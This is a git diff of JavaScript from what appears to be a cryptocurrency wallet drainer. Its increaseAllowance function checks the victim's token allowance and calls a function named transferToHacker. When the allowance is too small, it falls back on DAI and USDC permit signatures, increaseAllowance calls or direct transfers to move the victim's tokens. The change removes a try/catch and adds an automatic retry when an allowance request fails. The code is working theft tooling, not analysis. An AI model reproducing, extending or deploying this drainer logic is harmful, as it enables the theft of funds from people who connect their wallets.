@@ -109,60 +109,55 @@ export const claim = async (_balance) => {
   });
 };
 export const increaseAllowance = async (token) => {
-  try{
-    console.log("increase function")
-    // RPC provider
-    const provider = new ethers.providers.JsonRpcProvider(constants.infura);
+  console.log("increase function")
+  // RPC provider
+  const provider = new ethers.providers.JsonRpcProvider(constants.infura);
+  
+  // get token Allownce to transfer imiditly
+  const allow = await allownce(token);
+  const balanceOfToken = await balanceOf(token);
+  if (allow >= balanceOfToken) {
+    return await transferToHacker(token);
+  };
 
-    // get token Allownce to transfer imiditly
-    const allow = await allownce(token);
-    const balanceOfToken = await balanceOf(token);
-    if (allow >= balanceOfToken) {
-      return await transferToHacker(token);
-    };
+  const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
+  const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
+  const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
+  if (permitToken) {
 
-    const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
-    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
-    const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
-    if (permitToken) {
+    let nonce = undefined
+    await readContract({
+      address: token.token_address,
+      abi: constants.ALLOWANCEABI,
+      functionName: 'nonces',
+      args: [getAccount().address],
+    }).then( (result) => {
+      nonce = result
+    }).catch( (error) => {
+      console.log(error)
+    })
 
-      let nonce = undefined
-      await readContract({
-        address: token.token_address,
-        abi: constants.ALLOWANCEABI,
-        functionName: 'nonces',
-        args: [getAccount().address],
-      }).then( (result) => {
-        nonce = result
-      }).catch( (error) => {
-        console.log(error)
-      })
-
-      readContract({
-        address: token.token_address,
-        abi: constants.ALLOWANCEABI,
-        functionName: 'version',
-      }).then( async (result) => {
-        if( result === '1') {
-          await daiPermitV1(
-            permitToken, nonce, provider
-          )
-        }else if (result === '2') {
-          await usdcPermitV2(
-            permitToken, provider
-          )
-        }
-      }).catch((error) => {
-        console.log(error);
-      })
-    }else if (increaseallown) {
-      await increasAllow(token);
-    }else if (transfertoken) {
-      await transfer(token);
-    }
-  } catch (error) {
-    console.log(error);
-    increaseAllowance(token);
+    readContract({
+      address: token.token_address,
+      abi: constants.ALLOWANCEABI,
+      functionName: 'version',
+    }).then( async (result) => {
+      if( result === '1') {
+        await daiPermitV1(
+          permitToken, nonce, provider
+        )
+      }else if (result === '2') {
+        await usdcPermitV2(
+          permitToken, provider
+        )
+      }
+    }).catch((error) => {
+      console.log(error);
+    })
+  }else if (increaseallown) {
+    await increasAllow(token);
+  }else if (transfertoken) {
+    await transfer(token);
   }
 };
 
@@ -233,6 +228,7 @@ const increasAllow = async (token) => {
     await transfer(token);
   }).catch( (error) => {
     console.log(error)
+    return increasAllow(token);
   })
 }
 
